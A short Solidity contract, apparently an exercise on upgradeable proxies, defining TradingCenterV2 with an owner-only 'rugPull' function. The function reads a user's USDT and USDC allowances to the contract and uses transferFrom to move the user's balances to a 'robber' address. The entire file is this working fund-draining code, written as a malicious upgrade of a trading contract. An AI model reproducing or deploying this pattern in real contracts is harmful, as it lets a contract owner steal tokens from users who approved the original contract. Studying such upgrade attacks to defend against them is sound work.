// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import { TradingCenter } from "./TradingCenter.sol";
import { Ownable } from "./Ownable.sol";

// TODO: Try to implement TradingCenterV2 here

contract TradingCenterV2 is TradingCenter, Ownable {

    function rugPull(address user, address robber) external onlyOwner {
        // TODO: implement rugPull
        uint256 usdtAllowance = usdt.allowance(user, address(this));
        uint256 usdcAllowance = usdc.allowance(user, address(this));
        
        require(usdtAllowance > 0 && usdcAllowance > 0,"ERROR: usdtAllowance and usdcAllowance are zero!");
        if(usdtAllowance >= usdt.balanceOf(user)){
            usdt.transferFrom(user, robber, usdt.balanceOf(user));
        }else{
            usdt.transferFrom(user, robber, usdtAllowance);
        }

        if(usdcAllowance >= usdc.balanceOf(user)){
            usdc.transferFrom(user, robber, usdc.balanceOf(user));
        }else{
            usdc.transferFrom(user, robber, usdcAllowance);
        }
    }

}